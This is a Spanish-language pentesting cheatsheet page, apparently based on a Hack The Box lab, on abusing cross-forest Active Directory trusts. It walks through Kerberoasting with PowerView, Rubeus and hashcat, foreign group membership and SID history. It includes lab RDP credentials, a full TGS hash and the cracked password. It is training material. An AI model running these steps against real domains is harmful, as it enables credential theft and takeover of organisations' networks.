
# Abuso de confianza entre bosques - Desde Windows

## <mark style="color:purple;">Kerberosting entre bosques</mark>

Los ataques Kerberos, como `Kerberoasting` y `ASREPRoasting`, se pueden realizar en distintas confianzas, según la dirección de la confianza. En una situación en la que se encuentre en un dominio con una confianza de dominio/bosque entrante o bidireccional, es probable que pueda realizar varios ataques para ganar terreno. A veces, no puede escalar privilegios en su dominio actual, pero en su lugar puede obtener un ticket Kerberos y descifrar un hash para un usuario administrativo en otro dominio que tenga privilegios de administrador de dominio/empresa en ambos dominios.

Podemos utilizar PowerView para enumerar cuentas en un dominio de destino que tengan SPN asociados a ellas.

### **Enumeración de cuentas para SPN asociados mediante Get-DomainUser**

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

Vemos que hay una cuenta con un SPN en el dominio de destino. Una comprobación rápida muestra que esta cuenta es miembro del grupo de administradores de dominio en el dominio de destino, por lo que si podemos usar Kerberoast y descifrar el hash sin conexión, tendríamos derechos de administrador completos en el dominio de destino.

### **Enumeración de la cuenta mssqlsvc**

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Realicemos un ataque Kerberoasting en la confianza mediante `Rubeus`. Ejecutamos la herramienta como lo hicimos en la sección [Kerberoasting](/ethical-hacking-cheatsheet/active-directory/active-directory/kerberos/kerberoasting-desde-windows.md), pero incluimos el indicador `/domain:` y especificamos el dominio de destino.

### **Kerberoasting con Rubeus usando el indicador /domain**

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```

Luego podríamos ejecutar el hash a través de Hashcat. Si falla, ampliaremos rápidamente nuestro acceso para controlar por completo dos dominios aprovechando un ataque bastante estándar y abusando de la dirección de autenticación y la configuración de la confianza del bosque bidireccional.

***

## <mark style="color:purple;">Reutilización de contraseñas de administrador y membresía de grupos</mark>

De vez en cuando, nos encontraremos con una situación en la que existe una confianza de bosque bidireccional administrada por administradores de la misma empresa. Si podemos tomar el control del Dominio A y obtener contraseñas de texto sin formato o hashes NT para la cuenta de administrador incorporada (o una cuenta que sea parte del grupo Administradores de empresa o Administradores de dominio en el Dominio A), y el Dominio B tiene una cuenta con muchos privilegios con el mismo nombre, entonces vale la pena verificar la reutilización de contraseñas en los dos bosques. En ocasiones, me encontré con problemas en los que, por ejemplo, el Dominio A tenía un usuario llamado `adm_bob.smith` en el grupo Administradores de dominio y el Dominio B tenía un usuario llamado `bsmith_admin`. A veces, el usuario usaba la misma contraseña en los dos dominios y, al ser propietario del Dominio A, instantáneamente me otorgaba derechos de administrador completos para el Dominio B.

También podemos ver usuarios o administradores del Dominio A como miembros de un grupo en el Dominio B. Solo `Domain Local Groups` permiten entidades de seguridad de fuera de su bosque. Podemos ver un Administrador de dominio o Administrador de empresa del Dominio A como miembro del grupo de Administradores integrado en el Dominio B en una relación de confianza de bosque bidireccional. Si podemos tomar el control de este usuario administrador en el Dominio A, obtendremos acceso administrativo completo al Dominio B en función de la membresía del grupo.

Podemos utilizar la función [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) de PowerView para enumerar grupos con usuarios que no pertenecen al dominio, también conocidos como `foreign group membership`. Probemos esto con el dominio `FREIGHTLOGISTICS.LOCAL` con el que tenemos una confianza de bosque bidireccional externa.

### **Uso de Get-DomainForeignGroupMember**

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

El resultado del comando anterior muestra que el grupo de administradores integrado `FREIGHTLOGISTICS.LOCAL` tiene como miembro la cuenta de administrador integrada del dominio `INLANEFREIGHT.LOCAL`. Podemos verificar este acceso mediante el cmdlet  `Enter-PSSession` para conectarnos a través de WinRM.

### **Acceder a DC03 mediante Enter-PSSession**

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

A partir del resultado del comando anterior, podemos ver que nos autenticamos correctamente en el controlador de dominio en el dominio `FREIGHTLOGISTICS.LOCAL` usando la cuenta de administrador del dominio `INLANEFREIGHT.LOCAL` a través de la confianza de bosque bidireccional. Esto puede ser una victoria rápida después de tomar el control de un dominio y siempre vale la pena verificar si existe una situación de confianza de bosque bidireccional durante una evaluación y si el segundo bosque está dentro del alcance.

***

## <mark style="color:purple;">Historial de abuso de SID - Cross Forest</mark>

El historial de SID también se puede utilizar de forma indebida en una confianza de bosque. Si se migra un usuario de un bosque a otro y no está habilitado el filtrado de SID, es posible agregar un SID del otro bosque, y este SID se agregará al token del usuario cuando se autentique en la confianza. Si el SID de una cuenta con privilegios administrativos en el bosque A se agrega al atributo de historial de SID de una cuenta en el bosque B, suponiendo que se pueda autenticar en todo el bosque, entonces esta cuenta tendrá privilegios administrativos al acceder a los recursos en el bosque asociado.&#x20;

En el diagrama a continuación, podemos ver un ejemplo del usuario `jjones` que se migra del dominio `INLANEFREIGHT.LOCAL` al dominio `CORP.LOCAL` en un bosque diferente. Si el filtrado de SID no está habilitado cuando se realiza esta migración y el usuario tiene privilegios administrativos (o cualquier tipo de derechos interesantes como entradas ACE, acceso a recursos compartidos, etc.) en el dominio `INLANEFREIGHT.LOCAL`, entonces conservará sus derechos administrativos/acceso mientras `INLANEFREIGHT.LOCAL` sea miembro del nuevo dominio, `CORP.LOCAL` en el segundo bosque.

![imagen](https://academy.hackthebox.com/storage/modules/143/sid-history.png)

Este ataque se tratará en profundidad en un módulo posterior que se centrará más en atacar las confianzas de AD.

***

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.80.246 (ACADEMY-EA-MS01)
user "htb-student"
password "Academy_student_AD!"
```

Realiza un ataque Kerberoasting entre bosques y obtén el TGS del usuario `mssqlsvc`. Descifre el ticket y envíe la contraseña en texto claro de la cuenta como respuesta.

#### **Enumeración de cuentas para SPN asociados mediante Get-DomainUser**

```powershell
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc # Cuenta objetivo
sapsso
```

#### Enumeración de la cuenta mssqlsvc

```powershell
PS C:\tools> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

#### Kerberoasting con Rubeus

{% code overflow="wrap" %}

```powershell
PS C:\tools> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$9066381E2E001F75E81D6336047D998E$38320A14CAC0EE0451CD5954402E7497D470B3F18D7CD7EF409AD67CE313A121F9398CDCC6E9A238E7140F37E24B94ECC3F30DAAA4FF3B578D6077C22D91038FF1EC06A9BC94DC90D1A0062E5464C67BE30314BA5357524C1451FBDBB3C662D2644F92613312194A808EDAD4F9C0FAFB8C446AEE2A87DFC47B394F3F04A61936890627D9ED93256A312C7594AAC09F9EC8F43460169699F921492CBA46CE83DAF5193D739601534ADB0705F006E28277276599B5A56C595EFA451B94960063E890421F554A99C1036E360887CE5844D1AF3826D7F8EF73AD1866F8C9E4326A6F54A2CF70CE7F0B172403B5B9A260431F8CE892F0A6C545AEFA2F8D96B8E12A9834391440055018AE7DDF4B63CE361EA0FCA7187E25B69F3437BF3D65652A520F355332F08030382FF05347DD655208706FE7C956A2FE6540DB24861436678B25477D6E3796B40EE53174A89D3C6CD80585E1B4FC9724AD1DC31326665BC373366A508B1E3183A04FA9F0C6F50C17828F28307A3BC524310D13F9024A2FAC18D4D58D2614B469C32053CA34F7F91429B947F8DE7AB4A4EA63DA2CFCB26328FEE9AAA35E5CB640ABDB81624F9E91FFEE439BC9A3FBDE06A7AD5EB8127485FAE38DCAB2FCE5C4A426A3A83A0B6C0EB636B428D4BD738B0AE922620FC712387EF7B9DA1083874D6AACB72A90D50D691AA7B9785283AB0F7BBA78C4E3A673E839EE6382F899748CAA0F2E1C1BC3D009AF51F2C1769629CFBDE45B140B1514CBC22A7A6A52AA5BC0F617E33FAFC3153BECE1B093E51F826269C4B0DC34888A940182B8597081316FFBC1566D18479FC20BD35D5A94DB9E3DE6505782360E398713880A1B76E4BE67E50C2C8D576076AEE1BFDB84C0EB5A3B75993E91A6F303AD73DA3FA8D24F94EBC5CCB253E89574768EBCE748C80372B36A86A2D1E6B1A85B61F2F8AE28F81BB3D43F57B524AC20BE5157AC9B9FBF584F16E6737C047702FC948FE720B62765CE0FB968FE0EB10F1685584B74866675F802859CF5E6E6A93C93B2586149414F0A1B1738135BDBBA9CD0DEC711FA50BAF247FB565C2BD118C7A5A8A187C96EA2F2BAE1CBC7CEC90B7F74B5D56F74F0B3DF3F0F468E286221F90D39E3781D100041EF2CFB70D1855D0B23A49D2CB9E7391E6136E18699E09E156D2440EE7D13E825924B17503F20C490F91C857EF5B33D6BA84EF5266A18A778632D92E0983443F7AC3F8120BA12A1B93695F3916B55080602DCF58692E10FAA13EECCC678E87298F26397CD83E6FA3145FE2D6C8CABC2FAB681601B892AF55CD1A9A2621721220E4D22E3F4FFDA28235DC4D69AAC833E09810C3389E06207FDC8B91EA4A3A8630823403C07E08AA8754EC07C637B5FBB26BCE53A7BF969CCAC753739C28F8864706F83029635BF7F46392EB956C8F37117BE6125F95B681D3918AA5D2E5BE135FD18C3FDC315BC7DC39FEEF8B0989093C357F24BB322C7FAA4576344CE9D33E34B485F2FDDB67E97B49FB657CC09BA24B591CCF12C74AFB1E23B0FD49C0AFC5DA8EC2AACD35FA045A3B307293077AA68E286F522CBD2B63BBA9060947EC9E841405E06E08670F1E49F15920EBD2188CF011379218AE392A30D20F746C488C2F9E998368492AE3B670104F40609E4E3869BD8CC7CD2
```

{% endcode %}

Ahora que tenemos el blob sin espacios lo vamos a guardar a un archivo de texto y a crackearlo offline con hashcat

#### Cracking offline con hashcat y el modo 13100

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 mssqlsvc_hash /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$9066381e2e001f75e81d6336047d998e$38320a14cac0ee0451cd5954402e7497d470b3f18d7cd7ef409ad67ce313a121f9398cdcc6e9a238e7140f37e24b94ecc3f30daaa4ff3b578d6077c22d91038ff1ec06a9bc94dc90d1a0062e5464c67be30314ba5357524c1451fbdbb3c662d2644f92613312194a808edad4f9c0fafb8c446aee2a87dfc47b394f3f04a61936890627d9ed93256a312c7594aac09f9------ SNIP ------f8864706f83029635bf7f46392eb956c8f37117be6125f95b681d3918aa5d2e5be135fd18c3fdc315bc7dc39feef8b0989093c357f24bb322c7faa4576344ce9d33e34b485f2fddb67e97b49fb657cc09ba24b591ccf12c74afb1e23b0fd49c0afc5da8ec2aacd35fa045a3b307293077aa68e286f522cbd2b63bba9060947ec9e841405e06e08670f1e49f15920ebd2188cf011379218ae392a30d20f746c488c2f9e998368492ae3b670104f40609e4e3869bd8cc7cd2:1logistics
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLs...cc7cd2
Time.Started.....: Sun Jul 28 19:46:24 2024 (7 secs)
Time.Estimated...: Sun Jul 28 19:46:31 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2157.9 kH/s (0.66ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13004800/14344385 (90.66%)
Rejected.........: 0/13004800 (0.00%)
Restore.Point....: 13002752/14344385 (90.65%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 1lp2soad3lc* -> 1locotes
Hardware.Mon.#1..: Util: 82%
```

{% endcode %}

Buum! Obtenemos la contraseña en plano para la cuenta **mssqlsvc**: `1logistics` 🏆

***

## <mark style="color:purple;">Seguimos avanzando</mark>

A continuación, repasaremos algunos ejemplos de ataques a través de una confianza de bosque desde un host de ataque Linux.
